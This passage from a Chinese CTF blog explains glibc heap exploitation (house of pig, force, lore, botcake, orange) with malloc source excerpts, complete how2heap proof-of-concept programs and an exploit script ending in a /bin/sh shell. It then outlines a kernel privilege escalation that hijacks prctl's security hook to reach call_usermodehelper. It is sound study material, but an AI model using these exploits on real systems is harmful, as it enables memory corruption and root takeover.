b&#x27;\\x00&#x27;)+p64(vtable)    return IO_FILEr.recvuntil(b&quot;Gift:&quot;)_IO_str_jumps = libc_base+0x1ed560system_addr = libc_base+libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base+next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(1, 0xffffffffffff, heap_base +                        0x13c00+0xe0, heap_base+0x13c00+0xe0+0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27;+p64(system_addr)*2print(hex(len(file_struct[0x10:])))r.sendline(file_struct[0x10:])gdb.attach(r)r.recvuntil(b&#x27;Choice:&#x27;)r.sendline(b&#x27;5&#x27;)r.sendline(b&#x27;&#x27;)r.interactive()\n\n\n附件链接：https://github.com/01dwang/house_of_pig\n","categories":["pwn"],"tags":["house of pig","house of 系列"]},{"title":"house of ******","url":"/2022/03/03/house-of/","content":"没错！标题的星号就是脏字！\nhouse of force这个堆利用的方式是控制top chunk，把top chunk跑到任意位置。\n总所周知，在malloc的时候发现bin当中没有合适size的chunk的时候就去会割top chunk，那么是怎么隔的就看一下源码\nvictim = av-&gt;top;size = chunksize (victim);if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))&#123;    remainder_size = size - nb;    remainder = chunk_at_offset (victim, nb);    av-&gt;top = remainder;    set_head (victim, nb | PREV_INUSE |              (av != &amp;main_arena ? NON_MAIN_ARENA : 0));    set_head (remainder, remainder_size | PREV_INUSE);    check_malloced_chunk (av, victim, nb);    void *p = chunk2mem (victim);    alloc_perturb (p, bytes);    return p;&#125;\n\n#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))\n\n通过上面两个片段就很好可以看出来，只要我们top chunk的size大于我们申请的就会进入内部，然后注意remainder = chunk_at_offset (victim, nb);也就是当前的top chunk的地址加上申请的size，下面av-&gt;top = remainder;将地址赋值给top chunk，不过这里的问题则是如果我们后面给到一个负值，那么我们的top chunk就可以跑到任意地方了。所以来看看how2heap的poc：\n/*   This PoC works also with ASLR enabled.   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum    ( http://phrack.org/issues/66/10.html )   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04*/#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;char bss_var[] = &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123;\tfprintf(stderr, &quot;\\nWelcome to the House of Force\\n\\n&quot;);\tfprintf(stderr, &quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\\n&quot;);\tfprintf(stderr, &quot;The top chunk is a special chunk. Is the last in memory &quot;\t\t&quot;and is the chunk that will be resized when malloc asks for more space from the os.\\n&quot;);\tfprintf(stderr, &quot;\\nIn the end, we will use this to overwrite a variable at %p.\\n&quot;, bss_var);\tfprintf(stderr, &quot;Its current value is: %s\\n&quot;, bss_var);\tfprintf(stderr, &quot;\\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\\n&quot;);\tintptr_t *p1 = malloc(256);\tfprintf(stderr, &quot;The chunk of 256 bytes has been allocated at %p.\\n&quot;, p1 - 2);\tfprintf(stderr, &quot;\\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\\n&quot;);\tint real_size = malloc_usable_size(p1);\tfprintf(stderr, &quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\\n&quot;, real_size + sizeof(long)*2);\tfprintf(stderr, &quot;\\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\\n&quot;);\t//----- VULNERABILITY ----\tintptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size - sizeof(long));\tfprintf(stderr, &quot;\\nThe top chunk starts at %p\\n&quot;, ptr_top);\tfprintf(stderr, &quot;\\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\\n&quot;);\tfprintf(stderr, &quot;Old size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));\t*(intptr_t *)((char *)ptr_top + sizeof(long)) = -1;\tfprintf(stderr, &quot;New size of top chunk %#llx\\n&quot;, *((unsigned long long int *)((char *)ptr_top + sizeof(long))));\t//------------------------\tfprintf(stderr, &quot;\\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\\n&quot;\t   &quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\\n&quot;\t   &quot;overflow) and will then be able to allocate a chunk right over the desired region.\\n&quot;);\t/*\t * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):\t * new_top = old_top + nb\t * nb = new_top - old_top\t * req + 2sizeof(long) = new_top - old_top\t * req = new_top - old_top - 2sizeof(long)\t * req = dest - 2sizeof(long) - old_top - 2sizeof(long)\t * req = dest - old_top - 4*sizeof(long)\t */\tunsigned long evil_size = (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;\tfprintf(stderr, &quot;\\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\\n&quot;\t   &quot;we will malloc %#lx bytes.\\n&quot;, bss_var, ptr_top, evil_size);\tvoid *new_ptr = malloc(evil_size);\tfprintf(stderr, &quot;As expected, the new pointer is at the same place as the old top chunk: %p\\n&quot;, new_ptr - sizeof(long)*2);\tvoid* ctr_chunk = malloc(100);\tfprintf(stderr, &quot;\\nNow, the next chunk we overwrite will point at our target buffer.\\n&quot;);\tfprintf(stderr, &quot;malloc(100) =&gt; %p!\\n&quot;, ctr_chunk);\tfprintf(stderr, &quot;Now, we can finally overwrite that value:\\n&quot;);\tfprintf(stderr, &quot;... old string: %s\\n&quot;, bss_var);\tfprintf(stderr, &quot;... doing strcpy overwrite with \\&quot;YEAH!!!\\&quot;...\\n&quot;);\tstrcpy(ctr_chunk, &quot;YEAH!!!&quot;);\tfprintf(stderr, &quot;... new string: %s\\n&quot;, bss_var);\tassert(ctr_chunk == bss_var);\t// some further discussion:\t//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\\n\\n&quot;);\t//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;\t//\t&quot;and we \\nwant to set this result to the address of malloc_got_address-8\\n\\n&quot;);\t//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\\n\\n&quot;);\t//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\\n\\n&quot;);\t//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;\t//\t&quot;\\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\\n\\n&quot;);\t//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\\n&quot;,p2);\t//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\\n&quot;,malloc_got_address);\t//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\\n&quot;);&#125;\n\n上面的poc很清楚了，可以下去-g调一下。\nif (__glibc_unlikely (size &gt; av-&gt;system_mem))    malloc_printerr (&quot;malloc(): corrupted top size&quot;);\n\n以上片段是在glibc2.29当中新加的导致无法进行此种方法了。\nhouse of loraGlibc2.23这个攻击方式是针对small bin的攻击，先看源码：\nif (in_smallbin_range (nb))&#123;    idx = smallbin_index (nb);    bin = bin_at (av, idx);    if ((victim = last (bin)) != bin)    &#123;        if (victim == 0) /* initialization check */            malloc_consolidate (av);        else        &#123;            bck = victim-&gt;bk;            if (__glibc_unlikely (bck-&gt;fd != victim))            &#123;                errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                goto errout;            &#125;            set_inuse_bit_at_offset (victim, nb);            bin-&gt;bk = bck;            bck-&gt;fd = bin;            if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;            check_malloced_chunk (av, victim, nb);            void *p = chunk2mem (victim);            alloc_perturb (p, bytes);            return p;        &#125;    &#125;&#125;\n\n可以看到上面的操作是将最后一个chunk的bk赋值给bck，然后再把bin-&gt;bk=bck就把这个small bin chunk加入到了small bin中去了，不过需要绕过bck-&gt;fd!=victim，这里给出poc：\n/*Advanced exploitation of the House of Lore - Malloc Maleficarum.This PoC take care also of the glibc hardening of smallbin corruption.[ ... ]else    &#123;      bck = victim-&gt;bk;    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;       set_inuse_bit_at_offset (victim, nb);       bin-&gt;bk = bck;       bck-&gt;fd = bin;       [ ... ]*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[3] = &#123;0&#125;;  fprintf(stderr, &quot;\\nWelcome to the House of Lore\\n&quot;);  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n&quot;);  fprintf(stderr, &quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\\n\\n&quot;);  fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;);  intptr_t *victim = malloc(0x100);  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\\n&quot;, victim);  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  fprintf(stderr, &quot;stack_buffer_1 at %p\\n&quot;, (void*)stack_buffer_1);  fprintf(stderr, &quot;stack_buffer_2 at %p\\n&quot;, (void*)stack_buffer_2);  fprintf(stderr, &quot;Create a fake chunk on the stack\\n&quot;);  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;         &quot;in second to the last malloc, which putting stack address on smallbin list\\n&quot;);  stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;         &quot;chunk on stack&quot;);  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;    fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;         &quot;the small one during the free()\\n&quot;);  void *p5 = malloc(1000);  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\\n&quot;, p5);  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim);  free((void*)victim);  fprintf(stderr, &quot;\\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  fprintf(stderr, &quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\\n&quot;);  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\\n&quot;, victim);  void *p2 = malloc(1200);  fprintf(stderr, &quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n&quot;, p2);  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;);  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack  //------------------------------------  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\\n&quot;);  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n&quot;);  void *p3 = malloc(0x100);  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);  fprintf(stderr, &quot;p4 = malloc(0x100)\\n&quot;);  fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,         stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4); // this chunk will be allocated on stack  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  memcpy((p4+40), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n一样的上面的poc确实写的非常详细，自己下去调\nGlibc 2.27后此时就出现了tcache，存在了前几天的机制：\nif (in_smallbin_range (nb))&#123;    idx = smallbin_index (nb);    bin = bin_at (av, idx);    if ((victim = last (bin)) != bin)    &#123;        bck = victim-&gt;bk;        if (__glibc_unlikely (bck-&gt;fd != victim))            malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);        set_inuse_bit_at_offset (victim, nb);        bin-&gt;bk = bck;        bck-&gt;fd = bin;        if (av != &amp;main_arena)            set_non_main_arena (victim);        check_malloced_chunk (av, victim, nb);        #if USE_TCACHE        /* While we&#x27;re here, if we see other chunks of the same size,\t     stash them in the tcache.  */        size_t tc_idx = csize2tidx (nb);        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)        &#123;            mchunkptr tc_victim;            /* While bin not empty and tcache not full, copy chunks over.  */            while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count                   &amp;&amp; (tc_victim = last (bin)) != bin)            &#123;                if (tc_victim != 0)                &#123;                    bck = tc_victim-&gt;bk;                    set_inuse_bit_at_offset (tc_victim, nb);                    if (av != &amp;main_arena)                        set_non_main_arena (tc_victim);                    bin-&gt;bk = bck;                    bck-&gt;fd = bin;                    tcache_put (tc_victim, tc_idx);                &#125;            &#125;        &#125;        #endif        void *p = chunk2mem (victim);        alloc_perturb (p, bytes);        return p;    &#125;&#125;\n\n当我们把chunk放进了small bin就会马上进入到tcache内，并且还是个while循环，所以其实有了tcache之后这个就很难利用了，但是依旧是可以利用：\n/*Advanced exploitation of the House of Lore - Malloc Maleficarum.This PoC take care also of the glibc hardening of smallbin corruption.[ ... ]else    &#123;      bck = victim-&gt;bk;    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;       set_inuse_bit_at_offset (victim, nb);       bin-&gt;bk = bck;       bck-&gt;fd = bin;       [ ... ]*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] = &#123;0&#125;;  intptr_t* stack_buffer_2[3] = &#123;0&#125;;  void* fake_freelist[7][4];  fprintf(stderr, &quot;\\nWelcome to the House of Lore\\n&quot;);  fprintf(stderr, &quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\\n&quot;);  fprintf(stderr, &quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\\n\\n&quot;);  fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;);  intptr_t *victim = malloc(0x100);  fprintf(stderr, &quot;Allocated the first small chunk on the heap at %p\\n&quot;, victim);  fprintf(stderr, &quot;Allocating dummy chunks for using up tcache later\\n&quot;);  void *dummies[7];  for(int i=0; i&lt;7; i++) dummies[i] = malloc(0x100);  // victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk  intptr_t *victim_chunk = victim-2;  fprintf(stderr, &quot;stack_buffer_1 at %p\\n&quot;, (void*)stack_buffer_1);  fprintf(stderr, &quot;stack_buffer_2 at %p\\n&quot;, (void*)stack_buffer_2);  fprintf(stderr, &quot;Create a fake free-list on the stack\\n&quot;);  for(int i=0; i&lt;6; i++) &#123;    fake_freelist[i][3] = fake_freelist[i+1];  &#125;  fake_freelist[6][3] = NULL;  fprintf(stderr, &quot;fake free-list at %p\\n&quot;, fake_freelist);  fprintf(stderr, &quot;Create a fake chunk on the stack\\n&quot;);  fprintf(stderr, &quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;         &quot;in second to the last malloc, which putting stack address on smallbin list\\n&quot;);  stack_buffer_1[0] = 0;  stack_buffer_1[1] = 0;  stack_buffer_1[2] = victim_chunk;  fprintf(stderr, &quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;         &quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;         &quot;chunk on stack&quot;);  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;  fprintf(stderr, &quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;          &quot;introduced by smallbin-to-tcache mechanism\\n&quot;);  stack_buffer_2[3] = (intptr_t *)fake_freelist[0];    fprintf(stderr, &quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;         &quot;the small one during the free()\\n&quot;);  void *p5 = malloc(1000);  fprintf(stderr, &quot;Allocated the large chunk on the heap at %p\\n&quot;, p5);  fprintf(stderr, &quot;Freeing dummy chunk\\n&quot;);  for(int i=0; i&lt;7; i++) free(dummies[i]);  fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim);  free((void*)victim);  fprintf(stderr, &quot;\\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  fprintf(stderr, &quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\\n&quot;);  fprintf(stderr, &quot;This means that the chunk %p will be inserted in front of the SmallBin\\n&quot;, victim);  void *p2 = malloc(1200);  fprintf(stderr, &quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n&quot;, p2);  fprintf(stderr, &quot;The victim chunk has been sorted and its fwd and bk pointers updated\\n&quot;);  fprintf(stderr, &quot;victim-&gt;fwd: %p\\n&quot;, (void *)victim[0]);  fprintf(stderr, &quot;victim-&gt;bk: %p\\n\\n&quot;, (void *)victim[1]);  //------------VULNERABILITY-----------  fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;);  victim[1] = (intptr_t)stack_buffer_1; // victim-&gt;bk is pointing to stack  //------------------------------------  fprintf(stderr, &quot;Now take all dummies chunk in tcache out\\n&quot;);  for(int i=0; i&lt;7; i++) malloc(0x100);  fprintf(stderr, &quot;Now allocating a chunk with size equal to the first one freed\\n&quot;);  fprintf(stderr, &quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\\n&quot;);  void *p3 = malloc(0x100);  fprintf(stderr, &quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\\n&quot;);  char *p4 = malloc(0x100);  fprintf(stderr, &quot;p4 = malloc(0x100)\\n&quot;);  fprintf(stderr, &quot;\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n&quot;,         stack_buffer_2[2]);  fprintf(stderr, &quot;\\np4 is %p and should be on the stack!\\n&quot;, p4); // this chunk will be allocated on stack  intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode  long offset = (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8); // This bypasses stack-smash detection since it jumps over the canary  // sanity check  assert((long)__builtin_return_address(0) == (long)jackpot);&#125;\n\n可以看到，他这里是创建了一个假的fake_freelist，这个的作用就是到最后while循环时，将所有内容放入到tcache中，不然会引起崩溃\n\nhouse of botcake在glibc2.27里的tcache是什么验证都没加\nif (tcache    &amp;&amp; tc_idx &lt; mp_.tcache_bins    &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)&#123;    tcache_put (p, tc_idx);    return;&#125;\n\n所以可以很轻易的double free，但是在glibc2.29之后就不一样了：\nif (__glibc_unlikely (e-&gt;key == tcache))&#123;    tcache_entry *tmp;    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);    for (tmp = tcache-&gt;entries[tc_idx];         tmp;         tmp = tmp-&gt;next)        if (tmp == e)            malloc_printerr (&quot;free(): double free detected in tcache 2&quot;);    /* If we get here, it was a coincidence.  We&#x27;ve wasted a\t       few cycles, but don&#x27;t abort.  */&#125;if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)&#123;    tcache_put (p, tc_idx);    return;&#125;\n\n但是一样有办法可以让tcache存在我们指定地址的fake chunk，下面看poc：\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;    /*     * This attack should bypass the restriction introduced in     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d     * If the libc does not include the restriction, you can simply double free the victim and do a     * simple tcache poisoning     * And thanks to @anton00b and @subwire for the weird name of this technique */    // disable buffering so _IO_FILE does not interfere with our heap    setbuf(stdin, NULL);    setbuf(stdout, NULL);    // introduction    puts(&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;);    puts(&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;);    puts(&quot;This attack only relies on double free.\\n&quot;);    // prepare the target    intptr_t stack_var[4];    puts(&quot;The address we want malloc() to return, namely,&quot;);    printf(&quot;the target address is %p.\\n\\n&quot;, stack_var);    // prepare heap layout    puts(&quot;Preparing heap layout&quot;);    puts(&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;);    intptr_t *x[7];    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;        x[i] = malloc(0x100);    &#125;    puts(&quot;Allocating a chunk for later consolidation&quot;);    intptr_t *prev = malloc(0x100);    puts(&quot;Allocating the victim chunk.&quot;);    intptr_t *a = malloc(0x100);    printf(&quot;malloc(0x100): a=%p.\\n&quot;, a);     puts(&quot;Allocating a padding to prevent consolidation.\\n&quot;);    malloc(0x10);        // cause chunk overlapping    puts(&quot;Now we are able to cause chunk overlapping&quot;);    puts(&quot;Step 1: fill up tcache list&quot;);    for(int i=0; i&lt;7; i++)&#123;        free(x[i]);    &#125;    puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);    free(a);        puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);    free(prev);        puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n&quot;);    malloc(0x100);    /*VULNERABILITY*/    free(a);// a is already freed    /*VULNERABILITY*/        // simple tcache poisoning    puts(&quot;Launch tcache poisoning&quot;);    puts(&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;);    intptr_t *b = malloc(0x120);    puts(&quot;We simply overwrite victim&#x27;s fwd pointer&quot;);    b[0x120/8-2] = (long)stack_var;        // take target out    puts(&quot;Now we can cash out the target chunk.&quot;);    malloc(0x100);    intptr_t *c = malloc(0x100);    printf(&quot;The new chunk is at %p\\n&quot;, c);        // sanity check    assert(c==stack_var);    printf(&quot;Got control on target/stack!\\n\\n&quot;);        // note    puts(&quot;Note:&quot;);    puts(&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;);    puts(&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;);    return 0;&#125;\n\n其实很简单，也是利用了double free不过第一次free是将a丢进了unsorted bin当中，然后第二次free将a丢进了tcache，然后利用unsorted bin当中的chunk去修改tcache中的fd指针。\nhouse of orange这一攻击手法只是用于glibc2.27及一下，因为其中存在unsorted bin attack\n其实这一攻击手法也是非常简单，主要适用于程序当中不存在free的时候形成一个unsorted bin chunk然后经过unsorted bin attack进行FSOP\n因为涉及到的源码过多我这里只贴部分就行：\nif (av == NULL    || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)        &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max)))&#123;    char *mm;           /* return value from mmap call*/    try_mmap:\n\n首先我们肯定是不想进行mmap来新增堆空间的，所以我们不能大于他的阀值(0x2000)，其次我们如果要扩展top chunk需要绕过这几条判断：\n/* Record incoming configuration of top */old_top = av-&gt;top;old_size = chunksize (old_top);old_end = (char *) (chunk_at_offset (old_top, old_size));brk = snd_brk = (char *) (MORECORE_FAILURE);/*     If not the first time through, we require old_size to be     at least MINSIZE and to have prev_inuse set.   */assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||        ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;         prev_inuse (old_top) &amp;&amp;         ((unsigned long) old_end &amp; (pagesize - 1)) == 0));/* Precondition: not enough current space to satisfy nb request */assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));\n\n可以看到存在两个assert，第一个assert我们很好绕过，只需要保留top chunk的后三位即可保留，第二个则是我们申请的size大于top chunk的size。\n因为没找到poc我就自己写了一个，其实也是很简单的，很好就可以想到：\n#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main()&#123;    intptr_t *fp;    fp = malloc(0x10);    intptr_t *top;    top = fp + 2;    fprintf(stderr, &quot;the top chunk starts at %p;\\n&quot;, top);    fprintf(stderr, &quot;the size of top chunk is %#lx;\\n&quot;, *(top + 1));    *(top + 1) = 0xd91;    malloc(0x1000);    fprintf(stderr, &quot;Now,the top chunk is inserted the unsorted bin\\n&quot;);&#125;\n\n\n参考链接https://github.com/shellphish/how2heap\nhttps://www.anquanke.com/post/id/218887\n","categories":["pwn"],"tags":["house of 系列","house of force","house of lora","house of botcake","house of orange"]},{"title":"kernel pwn内存任意读写提升权限[2]","url":"/2022/08/04/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90-2/","content":"这次的例题是solid_core，题目的整体和前面那一道stringipc几乎一样\ncase 0x77617369:    if ( copy_from_user(&amp;v27, a3, 24LL) )        return -22LL;    v5 = v3 + 1;    mutex_lock(v3 + 1);    v16 = *v3;    v7 = v29;    if ( !*v3 )        goto LABEL_39;    v17 = *((_QWORD *)v16 + 3);    if ( (unsigned __int64)(v17 + v29) &gt; *((_QWORD *)v16 + 2) )        goto LABEL_25;    v18 = *((_QWORD *)v16 + 1) + v17;    if ( v18 &lt;= 0xFFFFFFFF7FFFFFFFLL )    &#123;        printk(&amp;unk_779, v28);    &#125;    else if ( strncpy_from_user(v18, v28, v29) &gt;= 0 )    &#123;        goto LABEL_19;    &#125;    goto LABEL_25;\n\n但是在写内容的这个地方和那一道题有些许不同，这里禁止往0xFFFFFFFF80000000之前的地址写入了，这也就导致昨天的两种利用方式无法使用了。\n原理分析Prctl是linux的一个函数，可以对进程、线程做一些设置，prctl内部通过虚表来调用对应的功能，如果我们劫持prctl的虚表，使它指向其他对我们有帮助的内核函数，比如call_usermodehelper函数，该函数执行一个用户传入的二进制文件，且以root权限执行，由此可以利用起来提权。\nSYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,                unsigned long, arg4, unsigned long, arg5)&#123;    struct task_struct *me = current;    unsigned char comm[sizeof(me-&gt;comm)];    long error;    error = security_task_prctl(option, arg2, arg3, arg4, arg5);    if (error != -ENOSYS)        return error;    ...\n\nprctl源码中调用了security_task_prctl函数\nint security_task_prctl(int option, unsigned long arg2, unsigned long arg3,                        unsigned long arg4, unsigned long arg5)&#123;    int thisrc;    int rc = -ENOSYS;    struct security_hook_list *hp;    list_for_each_entry(hp, &amp;security_hook_heads.task_prctl, list) &#123;        thisrc = hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);        if (thisrc != -ENOSYS) &#123;            rc = thisrc;            if (thisrc != 0)                break;        &#125;    &#125;    return rc;&#125;\n\n函数调用了task_prctl表里的函数，因此，如果我们劫持task_prctl表，就能通过执行prctl来执行我们想要的函数，比如call_usermodehelper函数。\n提一下call_usermodehelperh函数，这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令。起初的利用思路是劫持prctl的hook到这个函数，但存在一个问题，hp-&gt;hook.task_prctl(option, arg2, arg3, arg4, arg5);这里的option是int类型的，会存在一个截断，而四字节的地址一般是用户态地址，由于题目有smap显然是不行的。\nint call_usermodehelper(char *path, char **argv, char **envp, int wait)&#123;\tstruct subprocess_info *info;\tgfp_t gfp_mask = (wait == UMH_NO_WAIT) ? GFP_ATOMIC : GFP_KERNEL;\tinfo = call_usermodehelper_setup(path, argv, envp, gfp_mask,\t\t\t\t\t NULL, NULL, NULL);\tif (info == NULL)\t\treturn -ENOMEM;\treturn call_usermodehelper_exec(info, 